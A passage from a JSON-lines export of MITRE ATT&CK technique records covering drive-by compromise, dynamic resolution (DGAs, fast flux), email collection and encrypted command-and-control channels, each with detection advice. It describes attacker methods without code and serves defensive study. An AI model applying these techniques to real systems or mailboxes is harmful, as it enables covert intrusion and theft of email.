by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)","url":"https://attack.mitre.org/techniques/T1189","created":"18 April 2018","last modified":"14 April 2023","version":"1.5","tactics":"Initial Access","detection":"Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.\n\nNetwork intrusion detection systems, sometimes with SSL/TLS inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\n\nDetecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":"Linux, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cisco Group 72),(Citation: Microsoft PLATINUM April 2016),(Citation: IBM Grandoreiro April 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Securelist LuckyMouse June 2018),(Citation: Security Affairs Elderwood Sept 2012),(Citation: Symantec Elderwood Sept 2012),(Citation: Volexity Patchwork June 2018),(Citation: Secureworks REvil September 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: RATANKBA),(Citation: Google TAG Lazarus Jan 2021),(Citation: ESET LoudMiner June 2019),(Citation: ESET Bad Rabbit),(Citation: Volexity Ocean Lotus November 2020),(Citation: Unit 42 ProjectM March 2016),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: CSM Elderwood Sept 2012),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Kaspersky Darkhotel),(Citation: Symantec Tick Apr 2016),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: TrendMicro New Andariel Tactics July 2018),(Citation: Symantec Leafminer July 2018),(Citation: Picus Sodinokibi January 2020),(Citation: Symantec Patchwork),(Citation: Mandiant UNC3890 Aug 2022),(Citation: US-CERT TA18-074A),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Securelist ScarCruft Jun 2016),(Citation: Lookout Dark Caracal Jan 2018),(Citation: ESET OceanLotus),(Citation: Talos Transparent Tribe May 2021),(Citation: Securelist Machete Aug 2014),(Citation: Dell TG-3390),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: ESET Buhtrap and Buran April 2019),(Citation: MacKeeper Bundlore Apr 2019),(Citation: ESET ComRAT May 2020),(Citation: ESET RTM Feb 2017),(Citation: Gigamon Berserk Bear October 2021),(Citation: FireEye APT37 Feb 2018),(Citation: Secure List Bad Rabbit),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Bitdefender StrongPity June 2020),(Citation: objective-see windtail1 dec 2018),(Citation: Cylance Dust Storm),(Citation: FireEye APT38 Oct 2018),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Windigo Mar 2014),(Citation: Secureworks IRON HUNTER Profile),(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity),(Citation: Windows Blogs Microsoft Edge Sandbox)"}
{"ID":"T1568","name":"Dynamic Resolution","description":"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)","url":"https://attack.mitre.org/techniques/T1568","created":"10 March 2020","last modified":"11 March 2022","version":"1.0","tactics":"Command and Control","detection":"Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Chris Roffe","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: McAfee Maze March 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Unit42 Redaman January 2019),(Citation: Cylance Dust Storm),(Citation: CheckPoint Redaman October 2019),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: ESET Gelsemium June 2021),(Citation: Volexity SolarWinds),(Citation: FireEye APT30),(Citation: Talos Bisonal Mar 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: Unit 42 Gamaredon February 2022),(Citation: McAfee Night Dragon),(Citation: Cisco Umbrella DGA Brute Force),(Citation: Cybereason Dissecting DGAs)"}
{"ID":"T1568.003","name":"Dynamic Resolution: DNS Calculation","description":"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)\n\nOne implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)","url":"https://attack.mitre.org/techniques/T1568/003","created":"11 March 2020","last modified":"27 March 2020","version":"1.0","tactics":"Command and Control","detection":"Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1568","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Meyers Numbered Panda),"}
{"ID":"T1568.002","name":"Dynamic Resolution: Domain Generation Algorithms","description":"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)","url":"https://attack.mitre.org/techniques/T1568/002","created":"10 March 2020","last modified":"11 March 2022","version":"1.0","tactics":"Command and Control","detection":"Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1568","defenses bypassed":null,"contributors":"Barry Shteiman, Exabeam; Ryan Benson, Exabeam; Sylvain Gil, Exabeam","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ClearSky Siamesekitten August 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Cybereason Astaroth Feb 2019),(Citation: Intezer Doki July 20),(Citation: Trend Micro Conficker),(Citation: ProofPoint Ursnif Aug 2016),(Citation: Cybereason Bazar July 2020),(Citation: ESET Grandoreiro April 2020),(Citation: FireEye APT41 Aug 2019),(Citation: ESET Ebury Feb 2014),(Citation: BlackBerry CostaRicto November 2020),(Citation: Unit 42 TA551 Jan 2021),(Citation: Talos CCleanup 2017),(Citation: Accenture Lyceum Targets November 2021),(Citation: Zdnet Ngrok September 2018),(Citation: Securelist ShadowPad Aug 2017),(Citation: ESET Sednit 2017 Activity),(Citation: FireEye APT34 Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: FireEye POSHSPY April 2017),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: ESET Dukes October 2019),(Citation: SANS Conficker),(Citation: ESET Ebury Oct 2017),(Citation: CheckPoint Naikon May 2020),(Citation: Secureworks GOLD CABIN),(Citation: Cisco Umbrella DGA Brute Force),(Citation: Cybereason Dissecting DGAs),(Citation: Akamai DGA Mitigation)"}
{"ID":"T1568.001","name":"Dynamic Resolution: Fast Flux DNS","description":"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.","url":"https://attack.mitre.org/techniques/T1568/001","created":"11 March 2020","last modified":"27 March 2020","version":"1.0","tactics":"Command and Control","detection":"In general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1568","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Gh0stRAT ATT March 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Trend Micro njRAT 2018),(Citation: Korean FSI TA505 2020),(Citation: District Court of NY APT10 Indictment December 2018),"}
{"ID":"T1114","name":"Email Collection","description":"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ","url":"https://attack.mitre.org/techniques/T1114","created":"31 May 2017","last modified":"12 April 2023","version":"2.4","tactics":"Collection","detection":"There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nDetection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","platforms":"Google Workspace, Linux, Office 365, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, File: File Access, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Certfa Charming Kitten January 2021),(Citation: DOJ Iran Indictments March 2018),(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)"}
{"ID":"T1114.003","name":"Email Collection: Email Forwarding Rule","description":"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ","url":"https://attack.mitre.org/techniques/T1114/003","created":"19 February 2020","last modified":"12 April 2023","version":"1.3","tactics":"Collection","detection":"Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values.(Citation: Pfammatter - Hidden Inbox Rules)\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.","platforms":"Google Workspace, Linux, Office 365, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution","is sub-technique":true,"sub-technique of":"T1114","defenses bypassed":null,"contributors":"Liran Ravich, CardinalOps; Microsoft Security; Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CISA AA20-301A Kimsuky),(Citation: DOJ Iran Indictments March 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft Get-InboxRule),(Citation: Microsoft BEC Campaign),(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2),(Citation: Microsoft Manage Mail Flow Rules 2023),(Citation: Pfammatter - Hidden Inbox Rules)"}
{"ID":"T1114.001","name":"Email Collection: Local Email Collection","description":"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)","url":"https://attack.mitre.org/techniques/T1114/001","created":"19 February 2020","last modified":"24 March 2020","version":"1.0","tactics":"Collection","detection":"Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Windows","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1114","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Trend Micro Muddy Water March 2021),(Citation: Kroll Qakbot June 2020),(Citation: NCC Group Chimera January 2021),(Citation: Talos Smoke Loader July 2018),(Citation: Github PowerShell Empire),(Citation: Mandiant APT1),(Citation: F-Secure Cosmicduke),(Citation: GitHub Pupy),(Citation: FireEye CARBANAK June 2017),(Citation: FireEye APT35 2018),(Citation: CIS Emotet Dec 2018),(Citation: Trend Micro Qakbot December 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: McAfee Night Dragon),"}
{"ID":"T1114.002","name":"Email Collection: Remote Email Collection","description":"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.","url":"https://attack.mitre.org/techniques/T1114/002","created":"19 February 2020","last modified":"25 March 2021","version":"1.1","tactics":"Collection","detection":"Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).","platforms":"Google Workspace, Office 365, Windows","data sources":"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation","is sub-technique":true,"sub-technique of":"T1114","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: NCC Group Chimera January 2021),(Citation: Mandiant APT1),(Citation: NCC Group APT15 Alive and Strong),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: Cybereason Valak May 2020),(Citation: Symantec Leafminer July 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: US-CERT TA18-074A),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Microsoft HAFNIUM March 2020),(Citation: Volexity Exchange Marauder March 2021),(Citation: DFIR Phosphorus November 2021),(Citation: KISA Operation Muzabi),(Citation: Symantec Seaduke 2015),(Citation: Volexity SolarWinds),(Citation: GitHub MailSniper),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1573","name":"Encrypted Channel","description":"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.","url":"https://attack.mitre.org/techniques/T1573","created":"16 March 2020","last modified":"20 April 2021","version":"1.0","tactics":"Command and Control","detection":"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Red Canary NETWIRE January 2020),(Citation: Gh0stRAT ATT March 2019),(Citation: Cybereason Chaes Nov 2020),(Citation: Cybereason PowerLess February 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Threatpost Lizar May 2021),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: BiZone Lizar May 2021),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET DazzleSpy Jan 2022),"}
{"ID":"T1573.002","name":"Encrypted Channel: Asymmetric Cryptography","description":"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).","url":"https://attack.mitre.org/techniques/T1573/002","created":"16 March 2020","last modified":"20 April 2021","version":"1.0","tactics":"Command and Control","detection":"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1573","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant APT1 Appendix),(Citation: IBM Grandoreiro April 2020),(Citation: Fidelis Hi-Zor),(Citation: Blasco 2013),(Citation: NCSC APT29 July 2020),(Citation: Kaspersky Sodin July 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: ESET Kobalos Feb 2021),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Secureworks Karagany July 2019),(Citation: Securelist APT10 March 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: CISA WellMail July 2020),(Citation: Kaspersky Dridex May 2017),(Citation: Intezer Doki July 20),(Citation: Securelist WhiteBear Aug 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: FoxIT Wocao December 2019),(Citation: GitHub Sliver Encryption),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Check Point Pay2Key November 2020),(Citation: Dingledine Tor The Second-Generation Onion Router),(Citation: CISA WellMess July 2020),(Citation: SecureWorks WannaCry Analysis),(Citation: Talos Cobalt Strike September 2020),(Citation: IBM IcedID November 2017),(Citation: Mythc Documentation),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: ESET Zebrocy Nov 2018),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: NCSC Cyclops Blink February 2022),(Citation: Mandiant APT41),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye FIN6 April 2016),(Citation: Github PowerShell Empire),(Citation: PWC WellMess July 2020),(Citation: Leonardo Turla Penquin May 2020),(Citation: ESET ComRAT May 2020),(Citation: Github Koadic),(Citation: FireEye APT29 Nov 2018),(Citation: ESET Attor Oct 2019),(Citation: Juniper IcedID June 2020),(Citation: PWC WellMess C2 August 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: ESET Gazer Aug 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Accenture HyperStack October 2020),(Citation: Talos Promethium June 2020),(Citation: ESET Zebrocy May 2019),(Citation: ESET Sednit Part 2),(Citation: Bitdefender APT28 Dec 2015),(Citation: CISA ComRAT Oct 2020),(Citation: CISA Zebrocy Oct 2020),(Citation: Talos TinyTurla September 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: Talos PoetRAT April 2020),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: FireEye POSHSPY April 2017),(Citation: US-CERT Volgmer Nov 2017),(Citation: ESET Kobalos Jan 2021),(Citation: Cylance Machete Mar 2017),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Zscaler Bazar September 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: Trend Micro Emotet Jan 2019),(Citation: FireEye FiveHands April 2021),(Citation: Group IB GrimAgent July 2021),(Citation: GitHub Pupy),(Citation: Invincea XTunnel),"}
